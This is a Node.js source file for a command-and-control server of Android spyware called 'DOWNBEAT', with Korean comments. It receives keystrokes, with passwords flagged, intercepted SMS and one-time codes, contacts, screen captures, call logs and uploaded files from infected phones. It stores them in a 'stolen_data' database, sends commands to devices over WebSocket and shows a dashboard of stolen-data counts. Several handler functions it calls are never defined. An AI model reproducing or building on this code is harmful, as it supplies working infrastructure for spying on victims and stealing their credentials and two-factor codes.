// c2-server.js
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3');
const WebSocket = require('ws');

const app = express();
const upload = multer({ dest: 'uploads/' });

// 데이터베이스 초기화
const db = new sqlite3.Database('stolen_data.db');

db.run(`CREATE TABLE IF NOT EXISTS devices (
    id TEXT PRIMARY KEY,
    model TEXT,
    android_version TEXT,
    last_seen DATETIME,
    status TEXT
)`);

db.run(`CREATE TABLE IF NOT EXISTS keylogs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    timestamp DATETIME,
    package_name TEXT,
    text TEXT,
    is_password BOOLEAN,
    field_type TEXT
)`);

db.run(`CREATE TABLE IF NOT EXISTS sms (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    sender TEXT,
    message TEXT,
    otp_code TEXT,
    timestamp DATETIME
)`);

db.run(`CREATE TABLE IF NOT EXISTS contacts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    name TEXT,
    phone TEXT,
    email TEXT,
    data JSON
)`);

db.run(`CREATE TABLE IF NOT EXISTS files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    filename TEXT,
    path TEXT,
    size INTEGER,
    upload_time DATETIME
)`);

// API 엔드포인트
app.use(express.json());

app.post('/collect', (req, res) => {
    const { type, data, device_id, timestamp } = req.body;
    
    console.log(`[${new Date().toISOString()}] ${type} from ${device_id}`);
    
    switch(type) {
        case 'keylog_sensitive':
            handleKeylog(device_id, data);
            break;
            
        case 'sms_intercepted':
            handleSMS(device_id, data);
            break;
            
        case 'contacts':
            handleContacts(device_id, data);
            break;
            
        case 'screen_capture':
            handleScreenCapture(device_id, data);
            break;
            
        case 'call_started':
        case 'call_ended':
            handleCallLog(device_id, data);
            break;
            
        default:
            saveGenericData(type, device_id, data);
    }
    
    res.json({ status: 'received' });
});

// 파일 업로드
app.post('/upload', upload.single('file'), (req, res) => {
    const file = req.file;
    const { device_id, type } = req.body;
    
    console.log(`📁 File uploaded: ${file.originalname} from ${device_id}`);
    
    // 파일 저장
    const deviceDir = path.join('stolen_files', device_id);
    if (!fs.existsSync(deviceDir)) {
        fs.mkdirSync(deviceDir, { recursive: true });
    }
    
    const finalPath = path.join(deviceDir, file.originalname);
    fs.renameSync(file.path, finalPath);
    
    // DB 기록
    db.run(
        `INSERT INTO files (device_id, filename, path, size, upload_time)
         VALUES (?, ?, ?, ?, ?)`,
        [device_id, file.originalname, finalPath, file.size, new Date().toISOString()]
    );
    
    res.json({ status: 'uploaded' });
});

// 실시간 명령 전송 (WebSocket)
const wss = new WebSocket.Server({ port: 8080 });
const connectedDevices = new Map();

wss.on('connection', (ws, req) => {
    const device_id = req.url.split('/')[1];
    connectedDevices.set(device_id, ws);
    
    console.log(`🔌 Device connected: ${device_id}`);
    
    ws.on('message', (message) => {
        console.log(`📨 Message from ${device_id}: ${message}`);
    });
    
    ws.on('close', () => {
        connectedDevices.delete(device_id);
        console.log(`🔌 Device disconnected: ${device_id}`);
    });
});

// 명령 전송 API
app.post('/command', (req, res) => {
    const { device_id, command } = req.body;
    
    const ws = connectedDevices.get(device_id);
    if (ws) {
        ws.send(JSON.stringify({ command }));
        res.json({ status: 'sent' });
    } else {
        res.json({ status: 'device_offline' });
    }
});

// 대시보드
app.get('/dashboard', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>C&C Dashboard</title>
            <style>
                body { font-family: monospace; background: #000; color: #0F0; }
                .device { border: 1px solid #0F0; padding: 10px; margin: 10px; }
                .online { background: #001100; }
                .offline { background: #110000; }
                table { width: 100%; border-collapse: collapse; }
                td, th { border: 1px solid #0F0; padding: 5px; }
            </style>
        </head>
        <body>
            <h1>🎯 DOWNBEAT C&C DASHBOARD</h1>
            
            <h2>📱 Connected Devices: ${connectedDevices.size}</h2>
            <div id="devices"></div>
            
            <h2>📊 Statistics</h2>
            <div id="stats"></div>
            
            <h2>🔑 Recent Keylogs</h2>
            <div id="keylogs"></div>
            
            <h2>📨 Recent SMS</h2>
            <div id="sms"></div>
            
            <script>
                setInterval(() => {
                    fetch('/api/stats').then(r => r.json()).then(data => {
                        document.getElementById('stats').innerHTML = \`
                            <table>
                                <tr><td>Total Devices</td><td>\${data.devices}</td></tr>
                                <tr><td>Keylogs</td><td>\${data.keylogs}</td></tr>
                                <tr><td>SMS Intercepted</td><td>\${data.sms}</td></tr>
                                <tr><td>Files Stolen</td><td>\${data.files}</td></tr>
                                <tr><td>Contacts</td><td>\${data.contacts}</td></tr>
                            </table>
                        \`;
                    });
                }, 1000);
            </script>
        </body>
        </html>
    `);
});

// 통계 API
app.get('/api/stats', (req, res) => {
    const stats = {};
    
    db.get('SELECT COUNT(*) as count FROM devices', (err, row) => {
        stats.devices = row.count;
        
        db.get('SELECT COUNT(*) as count FROM keylogs', (err, row) => {
            stats.keylogs = row.count;
            
            db.get('SELECT COUNT(*) as count FROM sms', (err, row) => {
                stats.sms = row.count;
                
                db.get('SELECT COUNT(*) as count FROM files', (err, row) => {
                    stats.files = row.count;
                    
                    db.get('SELECT COUNT(*) as count FROM contacts', (err, row) => {
                        stats.contacts = row.count;
                        res.json(stats);
                    });
                });
            });
        });
    });
});

app.listen(3000, () => {
    console.log('🚀 C&C Server running on port 3000');
    console.log('🌐 Dashboard: http://localhost:3000/dashboard');
    console.log('🔌 WebSocket: ws://localhost:8080');
});
